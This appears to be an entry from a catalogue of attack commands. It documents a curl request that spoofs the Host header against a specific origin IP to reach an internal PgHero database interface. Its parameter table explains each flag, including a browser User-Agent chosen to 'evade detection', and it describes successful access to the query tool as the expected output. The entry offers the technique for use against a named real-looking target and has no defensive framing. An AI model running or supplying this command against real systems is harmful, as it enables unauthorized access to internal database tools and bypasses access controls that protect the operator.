---
data: >-
  curl -i -s -k -X GET -H 'Host: pghero.dev-go.exchange' -H 'Connection: close'
  -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132
  Safari/537.36' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H
  'Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
  -H 'Sec-Fetch-Site: same-origin' -H 'Referer: https://35.244.200.254/explain'
  -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language:
  fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.' https://35.244.200.254/
tags:
  - host-header
  - http-manipulation
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 660b4286-cac2-4fa3-bf53-d9b2e999f395
created_at: '2025-12-14T03:15:05.033Z'
updated_at: '2025-12-14T03:15:05.033Z'
verified: false
validated: true
submitted: true
---
# curl-host-header-spoof-to-pghero

## Command

```bash
curl -i -s -k -X GET -H 'Host: pghero.dev-go.exchange' -H 'Connection: close' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Sec-Fetch-Site: same-origin' -H 'Referer: https://35.244.200.254/explain' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.' https://35.244.200.254/
```

## Description

This curl command sends an HTTP GET request to an origin IP while spoofing the Host header to access an internal subdomain, bypassing load balancer restrictions for services like PgHero.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include response headers | Yes |
| `-s` | Silent mode (no progress) | Yes |
| `-k` | Ignore SSL certificate errors | Yes |
| `-X GET` | Specify GET method | Yes |
| `-H 'Host: ...'` | Spoof Host header to internal subdomain | Yes |
| `-H 'User-Agent: ...'` | Mimic browser to evade detection | Yes |
| `-H 'Referer: ...'` | Set internal referer path | No |
| URL | Target origin IP over HTTPS | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -H 'Host: internal.example.com' https://origin-ip/
```

### Advanced Usage

```bash
curl -i -s -k -X GET -H 'Host: pghero.dev-go.exchange' -H 'User-Agent: Mozilla/5.0 ...' https://35.244.200.254/
```

## Expected Output

HTTP/1.1 200 OK headers followed by HTML from the PgHero interface, indicating successful access to the query tool.

## Related

- [[Related Procedure: Access-PgHero-with-Curl-Host-Header-Spoofing]]
